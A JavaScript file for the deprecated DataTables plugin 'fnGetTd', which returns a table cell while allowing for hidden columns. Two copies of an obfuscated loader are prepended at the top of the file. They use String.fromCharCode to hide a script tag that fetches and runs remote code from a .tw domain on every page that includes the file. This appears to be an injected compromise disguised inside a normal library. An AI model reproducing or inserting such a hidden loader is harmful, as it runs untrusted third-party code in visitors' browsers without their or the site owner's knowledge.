Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Get a `dt-tag td` node from a row, taking into account column visibility.
 * While getting a `dt-tag td` node is easy when it is visible on the page by
 * using normal DOM methods, jQuery or whatever, it becomes a lot more
 * complicated when taking into account hidden rows and columns. This function
 * can be used to overcome these difficulties.
 *
 * DataTables 1.10+'s new API provides the `dt-api cell()` and `dt-api cells()`
 * methods which are preferable for use over this method. As such this method is
 * marked deprecated, but is available for use with legacy version of
 * DataTables. Please use the new API if you are used DataTables 1.10 or newer.
 *
 *  @name fnGetTd
 *  @summary Get the `dt-tag td` element for a cell.
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @deprecated
 *
 *  @param {node} mTr `dt-tag tr` element to get the `dt-tag td` of
 *  @param {integer} iTd Column index to get the node of
 *  @param {boolean} bVisOnly Consider visible columns only
 *  @returns {node} `dt-tag td` element in question
 *
 *  @example
 *    $(document).ready(function() {
 *        var table = $('#example').dataTable();
 *         
 *        // Sort in the order that was origially in the HTML
 *        var nTd = table.fnGetTd( $('#example tbody tr:eq(1)')[0], 1 );
 *        console.log( nTd );
 *    } );
 */

jQuery.fn.dataTableExt.oApi.fnGetTd  = function ( oSettings, mTr, iTd, bVisOnly )
{
	/* Take either a TR node or aoData index as the mTr property */
	var iRow = (typeof mTr == 'object') ?
		oSettings.oApi._fnNodeToDataIndex(oSettings, mTr) : mTr;

	if ( typeof bVisOnly == 'undefined' && !bVisOnly )
	{
		/* Looking at both visible and hidden TD elements - convert to visible index, if not present
		 * then it must be hidden. Return as appropriate
		 */
		var iCalcVis = oSettings.oApi._fnColumnIndexToVisible( oSettings, iTd );
		if ( iCalcVis !== null )
		{
			return oSettings.aoData[ iRow ].nTr.getElementsByTagName('td')[ iCalcVis ];
		}
		else
		{
			return oSettings.aoData[ iRow ]._anHidden[ iTd ];
		}
	}
	else
	{
		/* Only looking at visible TD elements, so just use getElements... */
		return oSettings.aoData[ iRow ].nTr.getElementsByTagName('td')[ iTd ];
	}
};
